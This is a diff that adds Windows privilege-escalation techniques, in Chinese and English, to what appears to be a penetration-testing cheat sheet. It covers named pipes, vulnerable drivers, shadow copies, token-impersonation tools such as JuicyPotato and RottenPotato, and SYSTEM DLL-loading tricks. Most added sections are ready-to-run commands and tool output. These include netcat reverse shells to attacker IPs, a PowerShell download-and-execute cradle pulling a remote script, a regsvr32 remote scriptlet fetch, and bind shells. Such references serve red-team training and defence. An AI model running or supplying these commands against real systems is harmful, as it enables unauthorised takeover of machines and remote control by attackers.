@@ -3,6 +3,21 @@
 * [Checklist - Windows主机信息全面搜集](#checklist---windows主机信息全面搜集)
 * [Checklist - Windows提权之前必要信息搜集](#checklist---windows提权之前必要信息搜集)
 * [Checklist - EoP - Windows各种提权方式](#eop---windows各种提权方式)
+  * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
+  * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
+  * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
+  * [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
+  * [EoP - Named Pipes](#eop---named-pipes)
+  * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
+  * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
+  * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
+  * [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
+  * [EoP - Runas](#eop---runas)
+  * [EoP - Abusing Shadow Copies](#eop---abusing-shadow-copies)
+  * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
+  * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
+  * [EoP - Impersonation Privileges](#eop---impersonation-privileges)
+  * [EoP - Privileged File Write](#eop---privileged-file-write)
 
 ### Checklist - Windows主机信息全面搜集
 
@@ -690,6 +705,12 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 # Metasploit提供了一个模块: exploit/windows/local/trusted_service_path
 ```
 
+#### EoP - Named Pipes
+
+1. 查找"命名管道"(Find named pipes): `[System.IO.Directory]::GetFiles("\\.\pipe\")`
+2. Check named pipes DACL: `pipesec.exe <named_pipe>`
+3. Reverse engineering software
+4. 通过某个"命名管道"发送数据(Send data throught the named pipe): `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`
 
 #### EoP - Kernel Exploitation
 
@@ -745,10 +766,44 @@ EoP - 不安全的GUI应用程序
 ```
 # ---------------
 # Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
-# 作为SYSTEM运行的应用程序允许用户生成CMD或浏览目录。
+# 作为SYSTEM运行的应用程序允许用户派生出一个CMD,或能能够浏览目录.
 
 # Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
 # 示例：“Windows帮助和支持”（Windows + F1），搜索“命令提示符”，单击“单击以打开命令提示符”
+```
+
+#### EoP - Evaluating Vulnerable Drivers
+
+Look for vuln drivers loaded, we often don't spend enough time looking at this:
+
+```powershell
+# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
+
+PS C:\Users\Swissky> driverquery.exe /fo table
+Module Name  Display Name           Driver Type   Link Date
+============ ====================== ============= ======================
+1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM
+3ware        3ware                  Kernel        5/18/2015 6:28:03 PM
+ACPI         Microsoft ACPI Driver  Kernel        12/9/1975 6:17:08 AM
+AcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM
+acpiex       Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM
+acpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM
+AcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM
+acpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM
+ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
+<SNIP>
+
+PS C:\Users\Swissky> DriverQuery.exe --no-msft
+[+] Enumerating driver services...
+[+] Checking file signatures...
+Citrix USB Filter Driver
+    Service Name: ctxusbm
+    Path: C:\Windows\system32\DRIVERS\ctxusbm.sys
+    Version: 14.11.0.138
+    Creation Time (UTC): 17/05/2018 01:20:50
+    Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US
+    Signer: CN="Citrix Systems, Inc.", OU=XenApp(ClientSHA256), O="Citrix Systems, Inc.", L=Fort Lauderdale, S=Florida, C=US
+<SNIP>
 ```
 
 #### EoP - Runas
@@ -771,10 +826,11 @@ Currently stored credentials:
 # 然后，您可以用runas 的 /savecred 选项，以便使用保存的凭据。
 # 以下示例通过SMB共享调用远程二进制文件。
 
-runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+runas /savecred /user:WORKGROUP\Administrator "\\10.0.0.1\SHARE\evil.exe"
 
 
 # Using runas with a provided set of credential.
+# 用已获取到的一组凭据 执行runas
 
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 
@@ -784,6 +840,212 @@ $ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $sec
 $ computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
+
+#### EoP - Abusing Shadow Copies
+
+If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.
+
+```powershell
+# List shadow copies using vssadmin (Needs Admnistrator Access)
+vssadmin list shadows
+  
+# List shadow copies using diskshadow
+diskshadow list shadows all
+  
+# Make a symlink to the shadow copy and access it
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+```
+
+#### EoP - From local administrator to NT SYSTEM
+
+```powershell
+PsExec.exe -i -s cmd.exe
+```
+
+#### EoP - Living Off The Land Binaries and Scripts
+
+Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/
+
+> The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.
+
+A LOLBin/Lib/Script must:
+
+* Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft.
+Have extra "unexpected" functionality. It is not interesting to document intended use cases.
+Exceptions are application whitelisting bypasses
+* Have functionality that would be useful to an APT or red team
+
+```powershell
+wmic.exe process call create calc
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+Microsoft.Workflow.Compiler.exe tests.xml results.xml
+```
+
+#### EoP - Impersonation Privileges
+
+Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.
+
+| Privilege | Impact | Tool | Execution path | Remarks |
+| --- | --- | --- | --- | --- |
+|`SeAssignPrimaryToken`| ***Admin*** | 3rd party tool | *"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
+|`SeBackup`| **Threat** | ***Built-in commands*** | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
+|`SeCreateToken`| ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`. ||
+|`SeDebug`| ***Admin*** | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
+|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
+|`SeRestore`| ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
+|`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
+|`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||
+
+
+##### Restore A Service Account's Privileges
+
+> This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.
+
+```powershell
+# https://github.com/itm4n/FullPowers
+
+c:\TOOLS>FullPowers
+[+] Started dummy thread with id 9976
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.19041.84]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+
+
+##### Meterpreter getsystem and alternatives
+
+```powershell
+meterpreter> getsystem 
+Tokenvator.exe getsystem cmd.exe 
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
+psexec -s -i cmd.exe 
+python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
+```
+
+##### RottenPotato (Token Impersonation)
+
+Binary available at : https://github.com/foxglovesec/RottenPotato
+Binary available at : https://github.com/breenmachine/RottenPotatoNG
+
+```c
+getuid
+getprivs
+use incognito
+list\_tokens -u
+cd c:\temp\
+execute -Hc -f ./rot.exe
+impersonate\_token "NT AUTHORITY\SYSTEM"
+```
+
+```powershell
+Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
+Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
+Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
+```
+
+
+##### Juicy Potato (abusing the golden privileges)
+
+Binary available at : https://github.com/ohpe/juicy-potato/releases    
+:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +. 
+
+1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
+
+```powershell
+whoami /priv
+```
+
+2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
+
+    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
+    * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
+    * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
+    * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
+    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
+    * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
+    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 
+
+3. Execute JuicyPotato to run a privileged command.
+
+```powershell
+    JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
+    JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+    JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
+        Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
+        ......
+        [+] authresult 0
+        {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
+        [+] CreateProcessWithTokenW OK
+```
+
+#### EoP - Privileged File Write
+
+##### DiagHub
+
+:warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.
+
+The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. 
+This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the `C:\Windows\System32` directory. 
+
+Exploit:
+
+1. Create an [evil DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) e.g: payload.dll and move it into `C:\Windows\System32`
+2. Build https://github.com/xct/diaghub
+3. `diaghub.exe c:\\ProgramData\\ payload.dll`
+
+The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`
+
+Alternative tools:
+* https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag
+* https://github.com/decoder-it/diaghub_exploit
+
+
+##### UsoDLLLoader
+
+:warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.
+
+> An alternative to the DiagHub DLL loading "exploit" found by James Forshaw (a.k.a. @tiraniddo)
+
+If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of `windowscoredeviceinfo.dll` into `C:\Windows\Sytem32\` and then have it loaded by the USO service to get arbitrary code execution as **NT AUTHORITY\System**.
+
+Exploit:
+
+1. Build https://github.com/itm4n/UsoDllLoader
+    * Select Release config and x64 architecure.
+    * Build solution.
+        * DLL .\x64\Release\WindowsCoreDeviceInfo.dll
+        * Loader .\x64\Release\UsoDllLoader.exe.
+2. Copy `WindowsCoreDeviceInfo.dll` to `C:\Windows\System32\`
+3. Use the loader and wait for the shell or run `usoclient StartInteractiveScan` and connect to the bind shell on port 1337.
+
+
+##### WerTrigger
+
+> Weaponizing for privileged file writes bugs with Windows problem reporting
+
+1. Clone https://github.com/sailay1996/WerTrigger
+2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
+3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
+4. Then, run `WerTrigger.exe`.
+5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
+
 
 #### EoP - Common Vulnerabilities and Exposure
 
@@ -804,4 +1066,3 @@ $ computer = "<hostname>"
 * 详细参考
   * [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#token-impersonation-rottenpotato)
   * [Windows-Notes-and-Cheatsheet.md](https://github.com/m0chan/m0chan.github.io/blob/master/_posts/2019-07-30-Windows-Notes-and-Cheatsheet.md)
-
